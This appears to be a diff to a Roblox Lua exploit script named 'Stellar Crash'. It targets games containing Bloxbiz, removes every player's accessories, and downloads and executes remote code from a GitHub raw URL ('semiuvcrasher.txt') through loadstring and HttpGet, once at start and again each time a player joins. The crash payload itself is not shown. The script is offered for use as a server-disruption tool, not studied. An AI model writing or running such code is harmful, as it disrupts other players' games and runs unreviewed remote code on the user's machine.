@@ -18,13 +18,29 @@ fpsLabel.TextSize = 20
 fpsLabel.Text = "FPS: 0"
 
 -- Function to check if the game contains "Bloxbiz"
-local function checkForBloxbiz()
+local function isGameSupported()
     for _, item in ipairs(ReplicatedStorage:GetDescendants()) do
         if item.Name:lower():find("bloxbiz") then
             return true
         end
     end
     return false
+end
+
+-- Notify whether the game is supported
+if isGameSupported() then
+    StarterGui:SetCore("SendNotification", {
+        Title = "Game Supported",
+        Text = "This game is supported. Stellar Crash is initializing...",
+        Duration = 5
+    })
+else
+    StarterGui:SetCore("SendNotification", {
+        Title = "Game Not Supported",
+        Text = "This game is not supported. No scripts will execute.",
+        Duration = 5
+    })
+    return -- Stop execution if the game is unsupported
 end
 
 -- Function to remove all accessories from all players
@@ -46,6 +62,34 @@ local frames = 0
 local fps = 0
 local lastUpdateTime = tick()
 
+-- Function to update FPS and remove accessories instantly if FPS drops below 20
+RunService.RenderStepped:Connect(function()
+    frames = frames + 1
+
+    -- Update FPS every 0.1 seconds
+    if tick() - lastUpdateTime >= 0.1 then
+        fps = frames / (tick() - lastUpdateTime)  -- FPS calculation for 0.1s window
+        frames = 0
+        lastUpdateTime = tick()
+
+        -- Update FPS display
+        fpsLabel.Text = "FPS: " .. tostring(math.floor(fps))
+
+        -- Check if FPS is below 20 and remove accessories instantly if necessary
+        if fps < 20 then
+            removeAllAccessories()
+            StarterGui:SetCore("SendNotification", {
+                Title = "Low FPS Detected",
+                Text = "FPS dropped below 20. Accessories removed.",
+                Duration = 5
+            })
+        end
+    end
+
+    -- Continuous accessory removal for optimization
+    removeAllAccessories()
+end)
+
 -- URLs for loadstring alternation
 local loadstringUrls = {
     "https://raw.githubusercontent.com/stellar-dv/stellar/refs/heads/main/semiuvcrasher.txt",
@@ -59,7 +103,9 @@ local function executeStellarCrash()
         loadstring(game:HttpGet(loadstringUrls[currentUrlIndex]))()
     end)
 
-    if not success then
+    if success then
+       print('good')
+    else
         warn("Failed to execute the script: " .. err)
     end
 
@@ -67,74 +113,33 @@ local function executeStellarCrash()
     currentUrlIndex = currentUrlIndex == 1 and 2 or 1
 end
 
--- Initial game check for "Bloxbiz"
-if checkForBloxbiz() then
+-- Execute the loadstring once at the start
+StarterGui:SetCore("SendNotification", {
+    Title = "Stellar Crash Initialized",
+    Text = "The crash script has been executed for the first time.",
+    Duration = 5
+})
+executeStellarCrash()
+
+-- Listen for new players joining and execute the loadstring again
+Players.PlayerAdded:Connect(function(player)
     StarterGui:SetCore("SendNotification", {
-        Title = "Game Supported",
-        Text = "This game contains Bloxbiz and is supported.",
+        Title = "New Player Joined",
+        Text = player.Name .. " joined the game. Refreshing Stellar Crash.",
         Duration = 5
     })
-
-    -- FPS monitoring and accessory removal
-    RunService.RenderStepped:Connect(function()
-        frames = frames + 1
-
-        -- Update FPS every 0.1 seconds
-        if tick() - lastUpdateTime >= 0.1 then
-            fps = frames / (tick() - lastUpdateTime)  -- FPS calculation for 0.1s window
-            frames = 0
-            lastUpdateTime = tick()
-
-            -- Update FPS display
-            fpsLabel.Text = "FPS: " .. tostring(math.floor(fps))
-
-            -- Check if FPS is below 20 and remove accessories instantly if necessary
-            if fps < 20 then
-                removeAllAccessories()
-                StarterGui:SetCore("SendNotification", {
-                    Title = "Low FPS Detected",
-                    Text = "FPS dropped below 20. Accessories removed.",
-                    Duration = 5
-                })
-            end
-        end
-
-        -- Continuous accessory removal for optimization
-        removeAllAccessories()
-    end)
-
-    -- Execute the loadstring once at the start
+    wait(2) -- Wait for a bit before refreshing
     executeStellarCrash()
+end)
 
-    -- Listen for new players joining and execute the loadstring again
-    Players.PlayerAdded:Connect(function(player)
+-- Optional: Notify when accessories are removed after respawn
+Players.PlayerAdded:Connect(function(player)
+    player.CharacterAdded:Connect(function()
+        removeAllAccessories()
         StarterGui:SetCore("SendNotification", {
-            Title = "New Player Joined",
-            Text = player.Name .. " joined the game. Refreshing Stellar Crash...",
+            Title = "Accessories Removed",
+            Text = "All accessories have been removed for " .. player.Name .. ".",
             Duration = 5
         })
-
-        -- Wait a short delay before executing the refresh
-        task.wait(2)
-        executeStellarCrash()
     end)
-
-    -- Optional: Notify when accessories are removed after respawn
-    Players.PlayerAdded:Connect(function(player)
-        player.CharacterAdded:Connect(function()
-            removeAllAccessories()
-            StarterGui:SetCore("SendNotification", {
-                Title = "Accessories Removed",
-                Text = "All accessories have been removed for " .. player.Name .. ".",
-                Duration = 5
-            })
-        end)
-    end)
-else
-    -- Notify that the game is not supported and exit
-    StarterGui:SetCore("SendNotification", {
-        Title = "Game Not Supported",
-        Text = "This game does not contain Bloxbiz. The script will not execute.",
-        Duration = 5
-    })
-end
+end)
